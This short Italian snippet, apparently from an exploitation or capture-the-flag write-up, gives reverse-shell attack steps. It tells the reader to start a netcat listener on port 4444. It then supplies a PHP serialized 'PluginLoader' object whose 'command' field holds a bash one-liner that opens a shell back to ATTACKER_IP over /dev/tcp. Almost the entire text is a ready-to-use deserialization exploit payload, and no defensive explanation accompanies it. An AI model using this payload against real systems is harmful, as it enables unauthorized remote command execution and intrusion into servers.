🔌 Reverse Shell
Apri un listener sulla tua macchina:
nc -lvp 4444

O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:50:"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'";}
